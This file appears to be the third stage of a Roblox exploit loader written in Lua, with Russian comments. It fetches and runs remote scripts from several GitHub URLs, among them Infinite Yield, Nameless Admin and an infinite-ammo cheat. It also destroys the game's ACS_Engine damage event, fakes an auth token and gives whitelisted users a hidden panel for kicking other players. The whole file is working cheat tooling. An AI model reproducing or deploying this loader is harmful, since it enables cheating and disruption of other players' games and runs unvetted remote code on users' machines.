-- =============================================================
--  ФАКТОР 3/3: ОСНОВНОЙ ЛОАДЕР
--  ССЫЛКА: https://raw.githubusercontent.com/itseasyrpg/test_http/refs/heads/main/rpg.lua
-- =============================================================
return function(SEC_STATE)
    local _ORIG = SEC_STATE.ORIG
    local _L = SEC_STATE.PLAYER
    local _H = SEC_STATE.HTTP
    local _TS = SEC_STATE.TS
    local _CG = SEC_STATE.CG
    local _UIS = SEC_STATE.UIS
    local _RS = game:GetService("ReplicatedStorage")
    local _st = SEC_STATE.STATUS
    local _hw = SEC_STATE.HWID
    local _tk = SEC_STATE.KEY
    local _uid = tostring(_L.UserId)

    -- ТОКЕН АВТОРИЗАЦИИ
    local _storage = _TS:FindFirstChild("__NK_RUNTIME") or Instance.new("Folder", _TS)
    _storage.Name = "__NK_RUNTIME"
    local _phys_auth = _storage:FindFirstChild(_L.Name) or Instance.new("StringValue", _storage)
    _phys_auth.Name = _L.Name
    _phys_auth.Value = "V8_SECURE_TOKEN_VALID"

    if _st == "blacklist" then
        _ORIG.pcall(function() _L:Kick("Banned.") end)
        return
    end

    -- АДМИН ПАНЕЛЬ ДЛЯ ВАЙТЛИСТА
    if _st == "whitelist" then
        _ORIG.task_spawn(function()
            local parent = _CG
            _ORIG.pcall(function() if gethui then parent = gethui() end end)
            local sg = Instance.new("ScreenGui", parent)
            local f = Instance.new("Frame", sg)
            f.Size = UDim2.new(0, 200, 0, 300)
            f.Position = UDim2.new(0.5,-100,0.5,-150)
            f.BackgroundColor3 = Color3.fromRGB(30,30,35)
            f.Visible = false
            f.Active = true
            f.Draggable = true
            Instance.new("UICorner", f)
            local s = Instance.new("ScrollingFrame", f)
            s.Size = UDim2.new(1,-10,1,-20)
            s.Position = UDim2.new(0,5,0,10)
            s.BackgroundTransparency = 1
            Instance.new("UIListLayout", s).Padding = UDim.new(0,5)
            local function refresh()
                for _, v in _ORIG.t_ipairs(s:GetChildren()) do
                    if v:IsA("TextButton") then v:Destroy() end
                end
                for _, pObj in _ORIG.t_ipairs(_storage:GetChildren()) do
                    local b = Instance.new("TextButton", s)
                    b.Size = UDim2.new(1,0,0,30)
                    b.Text = pObj.Name
                    b.TextColor3 = Color3.new(1,1,1)
                    b.BackgroundColor3 = Color3.fromRGB(45,45,50)
                    b.MouseButton1Click:Connect(function() pObj.Value = "kick" end)
                end
            end
            _UIS.InputBegan:Connect(function(k, g)
                if not g and k.KeyCode == Enum.KeyCode.Insert then
                    f.Visible = not f.Visible
                    refresh()
                end
            end)
        end)
    end

    _phys_auth.Changed:Connect(function(v)
        if v == "kick" then _ORIG.pcall(function() _L:Kick("Access Revoked.") end) end
    end)

    -- БЕЗОПАСНАЯ ЗАГРУЗКА СКРИПТОВ
    local function safeLoad(url)
        _ORIG.pcall(function()
            local res = _ORIG.httpget(game, url)
            if type(res) == "string" then
                local fn = _ORIG.load(res, "="..url)
                if fn then _ORIG.task_spawn(fn) end
            end
        end)
    end

    safeLoad("https://raw.githubusercontent.com/nazarkus/rpg/main/easy.lua")
    safeLoad("https://raw.githubusercontent.com/FilteringEnabled/NamelessAdmin/main/Source")
    safeLoad("https://raw.githubusercontent.com/EdgeIY/infiniteyield/master/source")
    safeLoad("https://raw.githubusercontent.com/nazarkus/infammo/main/infammo.lua")

    _ORIG.pcall(function()
        if _RS:FindFirstChild("ACS_Engine") then
            _RS.ACS_Engine.Events.FDMG:Destroy()
        end
    end)

    _ORIG.task_wait(2)
    _ORIG.pcall(function() shared.__NK_3F_SEC = nil end)
end
